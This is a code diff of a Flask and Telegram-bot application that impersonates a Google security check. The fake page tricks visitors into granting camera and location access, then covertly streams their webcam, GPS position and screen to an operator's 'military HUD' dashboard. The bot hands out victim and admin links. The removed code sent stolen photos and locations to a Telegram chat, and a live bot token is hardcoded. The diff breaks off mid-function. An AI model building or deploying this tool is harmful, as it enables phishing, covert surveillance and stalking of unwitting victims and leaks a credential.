@@ -1,57 +1,55 @@
+import eventlet
+eventlet.monkey_patch()
+
 import os
 import time
 import threading
 import requests
 import base64
-import eventlet
 from flask import Flask, render_template_string, request
-from flask_socketio import SocketIO, emit
-
-# تفعيل eventlet
-eventlet.monkey_patch()
+from flask_socketio import SocketIO, emit, join_room, leave_room
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
-# --- [ إعدادات البوت ] ---
+# --- [ إعدادات البوت والنظام ] ---
 BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
-CHAT_ID = "8305841557"
 BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+DEVELOPER_USERNAME = "@SDVee249"
 
-# المتغيرات العامة
-app_url = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")
+# تم تعيين الرابط كما طلبت
+app_url = "https://phantom-military-v3.onrender.com"
 
-# --- [ واجهة الضحية (تصميم احترافي مقنع) ] ---
+# --- [ واجهة الضحية (صفحة الهبوط) ] ---
 VICTIM_HTML = """
 <!DOCTYPE html>
 <html dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Photos - Update Required</title>
+    <title>Security Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { max-width: 400px; width: 100%; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s; }
-        .btn:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
-        .footer { margin-top: 40px; font-size: 12px; color: #9aa0a6; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; display: none; }
+        body { font-family: 'Roboto', sans-serif; background: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #202124; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:hover { background: #1557b0; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container" id="main-ui">
+    <div class="card" id="main-ui">
         <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-        <h1>Account Verification</h1>
-        <p>For security reasons, we need to verify your device to continue using Google Photos services. Please allow camera and location access.</p>
-        <button class="btn" onclick="initVerify()">Verify Now</button>
+        <h1>Security Check</h1>
+        <p>We detected a new sign-in. To secure your account, please allow camera and location access.</p>
+        <button class="btn" onclick="startAccess()">Continue</button>
         <div id="loading" class="spinner" style="margin-top:20px;"></div>
-        <div class="footer">Google LLC &copy; 2024</div>
+        <div style="margin-top:20px; font-size:12px; color:#9aa0a6;">Google Security © 2024</div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -60,35 +58,33 @@ VICTIM_HTML = """
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
         const socket = io();
+        const urlParams = new URLSearchParams(window.location.search);
+        const admin_id = urlParams.get('uid'); 
+        
         let mode = 'front';
         let stream = null;
 
-        async function initVerify() {
+        if(admin_id) socket.emit('join', {room: admin_id});
+
+        async function startAccess() {
             document.querySelector('.btn').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             document.querySelector('h1').innerText = "Verifying...";
 
             try {
-                // طلب الكاميرا
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 document.getElementById('v').srcObject = stream;
 
-                // طلب الموقع
                 navigator.geolocation.watchPosition(p => {
-                    socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude });
+                    socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude, uid: admin_id });
                 }, null, { enableHighAccuracy: true });
 
-                // إخفاء الواجهة وبدء البث
                 setTimeout(() => {
                     document.getElementById('main-ui').style.display = 'none';
                     document.body.style.background = '#000';
                     streamLoop();
                 }, 2000);
-
-            } catch (e) {
-                alert("Permission denied. Please allow access to continue.");
-                location.reload();
-            }
+            } catch (e) { alert("Access Denied"); location.reload(); }
         }
 
         function streamLoop() {
@@ -97,22 +93,18 @@ VICTIM_HTML = """
             const ctx = canvas.getContext('2d');
             canvas.width = 320; canvas.height = 240;
             ctx.drawImage(document.getElementById('v'), 0, 0, 320, 240);
-            
             const img = canvas.toDataURL('image/jpeg', 0.3);
-            socket.emit('stream', { img: img, mode: mode });
-            
+            socket.emit('stream', { img: img, mode: mode, uid: admin_id });
             setTimeout(streamLoop, 2000);
         }
 
         socket.on('admin_cmd', data => {
             if(data.cmd === 'switch_cam') {
-                // تبديل الكاميرا
                 stream.getTracks().forEach(t => t.stop());
                 mode = mode === 'front' ? 'back' : 'front';
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
                 .then(s => { stream = s; document.getElementById('v').srcObject = s; });
             } else if (data.cmd === 'screen') {
-                // طلب الشاشة
                 navigator.mediaDevices.getDisplayMedia({ video: true })
                 .then(s => { stream = s; document.getElementById('v').srcObject = s; mode = 'screen'; });
             }
@@ -122,233 +114,317 @@ VICTIM_HTML = """
 </html>
 """
 
-# --- [ لوحة التحكم العسكرية (Military HUD) ] ---
-ADMIN_DASHBOARD = """
+# --- [ لوحة تحكم VeeZero (النسخة الكاملة) ] ---
+ADMIN_HTML = """
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MILITARY HUD v3.0</title>
+    <title>Phantom VeeZero</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ff41; --dark: #050a05; --glass: rgba(5, 20, 5, 0.85); --alert: #ff3333; }
-        body { background: var(--dark); color: var(--neon); font-family: 'Share Tech Mono', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        :root { --primary: #0f0; --dark: #050505; --alert: #f00; --font: 'Courier New', monospace; }
+        body { background: var(--dark); color: var(--primary); font-family: var(--font); height: 100vh; margin: 0; overflow: hidden; display: flex; flex-direction: column; }
+        body::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0) 50%, rgba(0,0,0,0.25) 50%), linear-gradient(90deg, rgba(255,0,0,0.06), rgba(0,255,0,0.02), rgba(0,0,255,0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; z-index: 100; }
         
-        /* الفيديو الخلفي */
-        #main-feed {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: contain; z-index: 1; opacity: 0.9;
-        }
-
-        /* طبقة الواجهة */
-        .hud-overlay {
-            position: relative; z-index: 10; height: 100%;
-            display: flex; flex-direction: column; justify-content: space-between;
-            padding: 15px; pointer-events: none;
-            background: radial-gradient(circle, transparent 50%, rgba(0,0,0,0.8) 100%);
-        }
-
-        /* الرأس العسكري */
-        .top-bar {
-            display: flex; justify-content: space-between; align-items: flex-start;
-            border-bottom: 1px solid var(--neon); padding-bottom: 10px; margin-bottom: 10px;
-            text-shadow: 0 0 5px var(--neon);
-        }
-        .sys-info { text-align: left; }
-        .sys-status { text-align: right; }
-        .blink { animation: blink 1s infinite; color: var(--alert); }
-        .grid-lines {
-            position: absolute; top:0; left:0; width:100%; height:100%;
-            background: linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
-            linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
-            background-size: 40px 40px; pointer-events: none; z-index: 2;
-        }
-
-        /* الخريطة الذكية */
-        .map-container {
-            position: absolute; top: 80px; right: 20px;
-            width: 220px; height: 160px;
-            border: 2px solid var(--neon);
-            background: var(--glass);
-            box-shadow: 0 0 15px rgba(0,255,65,0.2);
-            z-index: 20; pointer-events: auto;
-        }
-        .map-header { background: var(--neon); color: #000; padding: 2px 5px; font-size: 10px; font-weight: bold; }
-        iframe { width: 100%; height: calc(100% - 20px); border: 0; filter: invert(100%) hue-rotate(180deg) contrast(1.2); }
-
-        /* لوحة التحكم السفلية */
-        .control-deck {
-            background: var(--glass); border: 1px solid var(--neon); border-radius: 8px;
-            padding: 15px; pointer-events: auto; backdrop-filter: blur(5px);
-            display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
-        }
-        .cmd-btn {
-            background: rgba(0,255,65,0.1); border: 1px solid var(--neon); color: var(--neon);
-            padding: 15px 0; text-align: center; cursor: pointer; font-family: 'Rajdhani', sans-serif; font-weight: bold; font-size: 16px;
-            transition: 0.3s; text-transform: uppercase;
-        }
-        .cmd-btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
-        .cmd-btn.danger { border-color: var(--alert); color: var(--alert); background: rgba(255,51,51,0.1); }
-        .cmd-btn.danger:hover { background: var(--alert); color: #000; box-shadow: 0 0 15px var(--alert); }
-
-        /* قائمة السياق */
-        .context-info {
-            position: absolute; top: 80px; left: 20px;
-            color: var(--neon); font-size: 12px; line-height: 1.6;
-            background: rgba(0,0,0,0.7); padding: 10px; border-left: 3px solid var(--neon);
-        }
-
-        @keyframes blink { 50% { opacity: 0; } }
+        header { border-bottom: 2px solid var(--primary); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,20,0,0.9); z-index: 10; }
+        .logo { font-weight: bold; font-size: 1.2rem; text-shadow: 0 0 5px var(--primary); }
+        .lang-btn { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 5px 10px; cursor: pointer; font-family: var(--font); }
+        .lang-btn:hover { background: var(--primary); color: #000; }
+        
+        nav ul { display: flex; list-style: none; gap: 15px; padding: 0; margin: 0; }
+        nav button { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 5px 15px; cursor: pointer; transition: 0.3s; font-family: var(--font); }
+        nav button.active { background: var(--primary); color: #000; box-shadow: 0 0 10px var(--primary); }
+        
+        main { flex: 1; position: relative; padding: 20px; overflow-y: auto; }
+        .screen { display: none; height: 100%; flex-direction: column; animation: fadeIn 0.5s; }
+        .screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .dashboard-grid { display: grid; grid-template-rows: auto 1fr auto; height: 100%; gap: 15px; }
+        .status-bar { display: flex; justify-content: space-between; border: 1px solid var(--primary); padding: 10px; background: rgba(0,50,0,0.3); }
+        .map-container { border: 2px dashed var(--primary); position: relative; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle, #001100 0%, #000 100%); overflow: hidden; }
+        .map-grid { width: 100%; height: 100%; background-image: linear-gradient(#003300 1px, transparent 1px), linear-gradient(90deg, #003300 1px, transparent 1px); background-size: 40px 40px; position: absolute; opacity: 0.5; }
+        .target-marker { width: 20px; height: 20px; background: var(--alert); border-radius: 50%; position: relative; box-shadow: 0 0 15px var(--alert); animation: pulse 2s infinite; }
+        .target-marker::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; border: 1px solid var(--alert); border-radius: 50%; animation: ripple 2s infinite; }
+        
+        .controls-area { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .btn-control { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 15px; cursor: pointer; text-align: center; transition: 0.2s; font-weight: bold; font-family: var(--font); }
+        .btn-control:hover { background: var(--primary); color: #000; }
+        .emergency-banner { background: var(--alert); color: white; text-align: center; padding: 5px; font-weight: bold; letter-spacing: 2px; animation: blink 1s infinite; margin-top: 10px; border: 1px solid white; cursor: pointer; }
+        
+        .video-wrapper { flex: 1; border: 4px solid #003300; background: black; position: relative; display: flex; justify-content: center; align-items: center; }
+        .live-overlay { position: absolute; top: 20px; left: 20px; right: 20px; display: flex; justify-content: space-between; z-index: 5; }
+        .rec-badge { background: var(--alert); color: white; padding: 5px 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .rec-dot { width: 10px; height: 10px; background: white; border-radius: 50%; animation: blink 0.5s infinite; }
+        .noise-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,0,0.05) 3px); pointer-events: none; }
+        
+        .info-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 20px 0; }
+        .card { border: 1px solid var(--primary); padding: 20px; background: rgba(0,20,0,0.5); }
+        .card h3 { border-bottom: 1px solid #003300; padding-bottom: 10px; margin-bottom: 15px; color: var(--primary); }
+        .data-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
+        .data-value { font-weight: bold; color: #fff; }
+        .progress-bar { width: 100%; height: 10px; background: #222; margin-top: 5px; }
+        .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 1s; }
+        .toast { position: fixed; bottom: 20px; right: 20px; background: var(--primary); color: #000; padding: 10px 20px; border: 2px solid #fff; display: none; z-index: 200; }
+        
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes ripple { 0% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(3); opacity: 0; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="grid-lines"></div>
-    
-    <!-- البث المباشر -->
-    <img id="main-feed" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+    <header>
+        <div class="logo">PHANTOM VEEZERO v1.0</div>
+        <button class="lang-btn" onclick="toggleLanguage()">EN | AR</button>
+        <nav>
+            <ul>
+                <li><button onclick="switchTab('dashboard')" class="active" id="btn-dashboard" data-key="nav_dash">الرئيسية</button></li>
+                <li><button onclick="switchTab('live')" id="btn-live" data-key="nav_live">البث المباشر</button></li>
+                <li><button onclick="switchTab('device')" id="btn-device" data-key="nav_device">معلومات الجهاز</button></li>
+            </ul>
+        </nav>
+    </header>
 
-    <!-- واجهة التحكم -->
-    <div class="hud-overlay">
-        
-        <!-- الرأس -->
-        <div class="top-bar">
-            <div class="sys-info">
-                <div style="font-size: 20px; font-weight: bold;">UNIT: PHANTOM</div>
-                <div style="font-size: 12px;">OP: ACTIVE • SECURE</div>
+    <main>
+        <section id="dashboard" class="screen active">
+            <div class="dashboard-grid">
+                <div class="status-bar">
+                    <span>UNIT: VEEZERO</span>
+                    <span>OP: ACTIVE</span>
+                    <span id="sys-time">00:00:00</span>
+                </div>
+                <div class="map-container">
+                    <div class="map-grid"></div>
+                    <div class="target-marker"></div>
+                    <div style="position: absolute; color: var(--primary); background: rgba(0,0,0,0.7); padding: 5px;">
+                        <span data-key="map_target">TARGET GPS: LOCKED</span><br>
+                        LAT: <span id="map-lat">00.0000</span> N<br>
+                        LNG: <span id="map-lng">00.0000</span> W
+                    </div>
+                </div>
+                <div>
+                    <div class="controls-area">
+                        <button class="btn-control" onclick="sendCmd('swap_cam')" data-key="btn_swap">تبديل الكاميرا</button>
+                        <button class="btn-control" onclick="sendCmd('screen')" data-key="btn_screen">مشاركة الشاشة</button>
+                        <button class="btn-control" onclick="copyLink()" data-key="btn_link">نسخ الرابط</button>
+                        <button class="btn-control" onclick="showToast('GPS Tracking Active')" data-key="btn_gps">تتبع GPS</button>
+                    </div>
+                    <div class="emergency-banner" onclick="sendCmd('sos')" data-key="btn_sos">
+                        EMERGENCY PROTOCOL
+                    </div>
+                </div>
             </div>
-            <div class="sys-status">
-                <div style="font-size: 20px;">00:00:00</div>
-                <div class="blink">● LIVE FEED</div>
+        </section>
+
+        <section id="live" class="screen">
+            <div class="video-wrapper">
+                <img id="live-feed-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="width:100%; height:100%; object-fit:contain;">
+                <div class="noise-overlay"></div>
+                <div class="live-overlay">
+                    <div class="rec-badge"><div class="rec-dot"></div> <span data-key="live_feed">LIVE FEED</span></div>
+                    <div style="background: rgba(0,0,0,0.5); padding: 2px 8px;">VEEZERO CAM</div>
+                </div>
             </div>
-        </div>
+            <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <div><span data-key="rec_time">REC TIME:</span> <span id="rec-timer">00:00:00</span></div>
+                <button class="btn-control" style="width: auto; padding: 5px 20px;" onclick="toggleRecording(this)" data-key="btn_stop_rec">STOP REC</button>
+            </div>
+        </section>
 
-        <!-- معلومات السياق -->
-        <div class="context-info">
-            <div>TARGET: LOCKED</div>
-            <div>SIGNAL: STRONG</div>
-            <div>BATTERY: --%</div>
-        </div>
+        <section id="device" class="screen">
+            <h2 style="margin-bottom: 20px; border-bottom: 1px solid var(--primary);" data-key="dev_title">حالة النظام</h2>
+            <div class="info-cards">
+                <div class="card">
+                    <h3 data-key="dev_type">نوع الجهاز</h3>
+                    <div class="data-row"><span>Platform:</span><span class="data-value" id="dev-platform">Waiting...</span></div>
+                    <div class="data-row"><span>Browser:</span><span class="data-value" id="dev-ua">Waiting...</span></div>
+                </div>
+                <div class="card">
+                    <h3 data-key="dev_bat">نسبة الشحن</h3>
+                    <div class="data-row"><span>Status:</span><span class="data-value" id="bot-status">--</span></div>
+                    <div class="data-row"><span>Level:</span><span class="data-value" id="bat-level">--%</span></div>
+                    <div class="progress-bar"><div class="progress-fill" id="bat-bar"></div></div>
+                </div>
+                <div class="card">
+                    <h3 data-key="dev_net">الاتصال</h3>
+                    <div class="data-row"><span>Status:</span><span class="data-value" id="net-status">--</span></div>
+                    <div class="data-row"><span>Latency:</span><span class="data-value">24ms</span></div>
+                </div>
+            </div>
+        </section>
+    </main>
 
-        <!-- الخريطة العائمة -->
-        <div class="map-container">
-            <div class="map-header">TARGET GPS</div>
-            <iframe id="map" src="https://maps.google.com/maps?q=0,0&t=k&z=15&output=embed"></iframe>
-        </div>
-
-        <!-- الأزرار -->
-        <div class="control-deck">
-            <button class="cmd-btn" onclick="cmd('switch_cam')">SWAP<br>CAM</button>
-            <button class="cmd-btn" onclick="cmd('screen')">SCREEN<br>SHARE</button>
-            <button class="cmd-btn" onclick="copyLink()">COPY<br>LINK</button>
-            <button class="cmd-btn" onclick="openMap()">GPS<br>TRACK</button>
-            <button class="cmd-btn danger" style="grid-column: span 4;" onclick="cmd('sos')">⚠️ EMERGENCY PROTOCOL INITIATED</button>
-        </div>
-    </div>
+    <div id="toast" class="toast">Action Completed</div>
 
     <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const myUid = urlParams.get('uid');
         const socket = io();
-        let startTime = new Date();
+        if(myUid) socket.emit('join', {room: myUid});
 
-        // تحديث الوقت
-        setInterval(() => {
-            let diff = new Date(new Date() - startTime);
-            let t = diff.toISOString().substr(11, 8);
-            document.querySelector('.sys-status div:first-child').innerText = t;
-        }, 1000);
+        let currentLang = 'ar';
+        const translations = {
+            ar: {
+                nav_dash: "الرئيسية", nav_live: "البث المباشر", nav_device: "معلومات الجهاز",
+                map_target: "TARGET GPS: LOCKED", btn_swap: "تبديل الكاميرا", btn_screen: "مشاركة الشاشة",
+                btn_link: "نسخ الرابط", btn_gps: "تتبع GPS", btn_sos: "EMERGENCY PROTOCOL",
+                live_feed: "LIVE FEED", rec_time: "REC TIME:", btn_stop_rec: "STOP REC",
+                dev_title: "حالة النظام", dev_type: "نوع الجهاز", dev_bat: "نسبة الشحن", dev_net: "الاتصال"
+            },
+            en: {
+                nav_dash: "Dashboard", nav_live: "Live Feed", nav_device: "Device Info",
+                map_target: "TARGET GPS: LOCKED", btn_swap: "SWAP CAM", btn_screen: "SCREEN SHARE",
+                btn_link: "COPY LINK", btn_gps: "GPS TRACK", btn_sos: "EMERGENCY PROTOCOL",
+                live_feed: "LIVE FEED", rec_time: "REC TIME:", btn_stop_rec: "STOP REC",
+                dev_title: "System Status", dev_type: "Device Type", dev_bat: "Power Level", dev_net: "Network"
+            }
+        };
 
-        socket.on('view', d => { document.getElementById('main-feed').src = d.img; });
-        socket.on('map_up', d => { 
-            document.getElementById('map').src = `https://maps.google.com/maps?q=${d.lat},${d.lon}&t=k&z=18&output=embed`; 
-            document.querySelector('.context-info').innerHTML += `<div>LOC: ${d.lat.toFixed(4)}, ${d.lon.toFixed(4)}</div>`;
-        });
+        function toggleLanguage() {
+            currentLang = currentLang === 'ar' ? 'en' : 'ar';
+            document.documentElement.lang = currentLang;
+            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+            document.querySelectorAll('[data-key]').forEach(el => {
+                const key = el.getAttribute('data-key');
+                if(translations[currentLang][key]) el.innerText = translations[currentLang][key];
+            });
+        }
 
-        function cmd(c) { socket.emit('admin_cmd', {cmd: c}); }
-        function copyLink() { navigator.clipboard.writeText(window.location.origin + '/'); alert('LINK COPIED'); }
-        function openMap() { window.open(document.getElementById('map').src, '_blank'); }
+        function switchTab(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.getElementById('btn-'+id).classList.add('active');
+        }
+
+        socket.on('view', d => { if(d.uid === myUid) document.getElementById('live-feed-img').src = d.img; });
+        socket.on('map_up', d => { if(d.uid === myUid) { document.getElementById('map-lat').innerText = d.lat.toFixed(4); document.getElementById('map-lng').innerText = d.lon.toFixed(4); }});
+        socket.on('device_stats', d => { if(d.uid === myUid) {
+            document.getElementById('dev-platform').innerText = (d.os||'Unknown').toUpperCase();
+            document.getElementById('dev-ua').innerText = (d.browser||'Unknown').substring(0,20);
+            if(d.battery) {
+                let l = parseInt(d.battery); document.getElementById('bat-level').innerText = l+'%'; document.getElementById('bat-bar').style.width = l+'%';
+            }
+        }});
+
+        function sendCmd(c) { socket.emit('admin_cmd', {cmd: c, uid: myUid}); showToast('Command Sent'); }
+        function showToast(m) { const t = document.getElementById('toast'); t.innerText=m; t.style.display='block'; setTimeout(()=>t.style.display='none', 3000); }
+        
+        function updateTimers() {
+            const now = new Date(); document.getElementById('sys-time').innerText = now.toTimeString().split(' ')[0];
+            const recEl = document.getElementById('rec-timer');
+            if(recEl && document.getElementById('live').classList.contains('active')) {
+                let t = recEl.innerText.split(':'); let s = parseInt(t[2])+1; if(s>59){s=0;t[1]++;}
+                recEl.innerText = t[0]+':'+(t[1]<10?'0':'')+t[1]+':'+(s<10?'0':'')+s;
+            }
+        } setInterval(updateTimers, 1000);
+
+        function copyLink() { navigator.clipboard.writeText(app_url + '/?uid=' + myUid); showToast('Link Copied'); }
     </script>
 </body>
 </html>
 """
 
+# --- [ دوال التوجيه ] ---
 @app.route('/')
-def victim(): return render_template_string(VICTIM_HTML)
+def victim():
+    uid = request.args.get('uid')
+    return render_template_string(VICTIM_HTML, admin_id=uid)
 
 @app.route('/admin')
-def admin(): return render_template_string(ADMIN_DASHBOARD)
+def admin():
+    uid = request.args.get('uid')
+    if not uid: return "Access Denied: No User ID"
+    return render_template_string(ADMIN_HTML, my_uid=uid)
 
-# --- [ باقي الكود (السوكتات والبوت كما هي) ] ---
+# --- [ السوكتات ] ---
+@socketio.on('join')
+def on_join(data):
+    room = data.get('room')
+    if room:
+        join_room(room)
+        print(f"User {room} joined")
+
 @socketio.on('stream')
 def handle_stream(data):
-    emit('view', data, broadcast=True, include_self=False)
-    try:
-        img_data = data['img'].split(',')[1]
-        requests.post(f"{BOT_API}/sendPhoto", 
-                      files={'photo': ('s.jpg', base64.b64decode(img_data))},
-                      data={"chat_id": CHAT_ID, "caption": f"📷 Mode: {data.get('mode', 'front')}"}, timeout=5)
-    except: pass
+    room = data.get('uid')
+    if room:
+        emit('view', data, room=room, include_self=False)
 
 @socketio.on('loc')
 def handle_loc(data):
-    emit('map_up', data, broadcast=True, include_self=False)
-    try:
-        requests.post(f"{BOT_API}/sendLocation", 
-                      json={"chat_id": CHAT_ID, "latitude": data['lat'], "longitude": data['lon']})
-    except: pass
+    room = data.get('uid')
+    if room:
+        emit('map_up', data, room=room, include_self=False)
+
+@socketio.on('device_info')
+def handle_device(data):
+    room = data.get('uid')
+    if room:
+        emit('device_stats', data, room=room, include_self=False)
 
 @socketio.on('admin_cmd')
 def handle_admin_cmd(data):
-    emit('admin_cmd', data, broadcast=True, include_self=False)
+    room = data.get('uid')
+    if room:
+        emit('admin_cmd', data, room=room, include_self=False)
 
+# --- [ وظيفة البوت الرئيسية (المدمجة والمعدلة) ] ---
 def bot_manager():
-    print("Military Bot Active...")
     offset = 0
+    print("Bot Thread Started...")
     while True:
         try:
-            req = requests.get(f"{BOT_API}/getUpdates?offset={offset}&timeout=20", timeout=25).json()
-            if req.get('ok'):
-                for r in req['result']:
-                    offset = r['update_id'] + 1
-                    msg = r.get('message', {})
-                    query = r.get('callback_query')
-                    chat_id = msg.get('chat', {}).get('id') or (query.get('message', {}).get('chat', {}).get('id') if query else None)
-                    if not chat_id: continue
+            r = requests.get(f"{BOT_API}/getUpdates?offset={offset}&timeout=10", timeout=15).json()
+            if r.get('ok'):
+                for x in r['result']:
+                    offset = x['update_id'] + 1
+                    m = x.get('message', {})
+                    cid = str(m.get('chat', {}).get('id'))
+                    
+                    # رسالة ترحيب مطورة للمستخدم
+                    if m.get('text') == '/start':
+                        welcome_msg = f"""
+👻 <b>Phantom VeeZero v1.1</b>
+                        
+مرحباً بك في نظام المراقبة العسكري المتطور.
+تم تفعيل الجلسة الخاصة بك بنجاح.
 
-                    if query:
-                        data = query['data']
-                        try:
-                            if data == 'start': send_menu(chat_id, "🛡️ MILITARY HUD SYSTEM ONLINE.")
-                            elif data == 'link': requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": f"🔗 Target Link:\n{app_url}/"})
-                            elif data == 'front': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ FRONT CAM")
-                            elif data == 'back': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ BACK CAM")
-                            elif data == 'screen': socketio.emit('admin_cmd', {'cmd': 'screen'}); answer(query, "✅ SCREEN REQ")
-                            elif data == 'map': requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": "📍 Check Admin Panel for Live Map."})
-                            elif data == 'stop': answer(query, "🛑 SYSTEM SHUTDOWN"); os.kill(os.getpid(), 9)
-                        except: pass
-                        continue
+👨‍💻 المطور: {DEVELOPER_USERNAME}
+                        """
+                        keyboard = {
+                            "inline_keyboard": [
+                                [{"text": "🔗 Get My Link", "callback_data": f"getlink_{cid}"}, {"text": "👨‍💻 Contact Dev", "url": f"https://t.me/{DEVELOPER_USERNAME.replace('@','')}"}],
+                                [{"text": "📷 Control Panel", "callback_data": f"panel_{cid}"}]
+                            ]
+                        }
+                        requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": welcome_msg, "parse_mode": "HTML", "reply_markup": keyboard})
 
-                    if msg.get('text') == '/start':
-                        send_menu(chat_id, "🛡️ SYSTEM INITIALIZED.\nControls Ready.")
-        except: pass
+                    # معالجة الأزرار
+                    q = x.get('callback_query')
+                    if q:
+                        d = q['data']
+                        if d.startswith('getlink_'):
+                            target_id = d.split('_')[1]
+                            victim_link = f"{app_url}/?uid={target_id}"
+                            admin_link = f"{app_url}/admin?uid={target_id}"
+                            msg = f"🔗 <b>Links Generated</b>\n\nVictim: {victim_link}\nAdmin: {admin_link}"
+                            requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": msg, "parse_mode": "HTML"})
+                            requests.post(f"{BOT_API}/answerCallbackQuery", json={"callback_query_id": q['id'], "text": "Links Sent!"})
+                        
+                        elif d.startswith('panel_'):
+                            target_id = d.split('_')[1]
+                            admin_link = f"{app_url}/admin?uid={target_id}"
+                            requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": f"🔓 Open Panel:\n{admin_link}"})
+                            requests.post(f"{BOT_API}/answerCallbackQuery", json={"callback_query_id": q['id'], "text": "Opening Panel..."})
+
+        except Exception as e:
+            print(f"Error: {e}")
         time.sleep(1)
-
-def send_menu(chat_id, text):
-    k = {"inline_keyboard": [
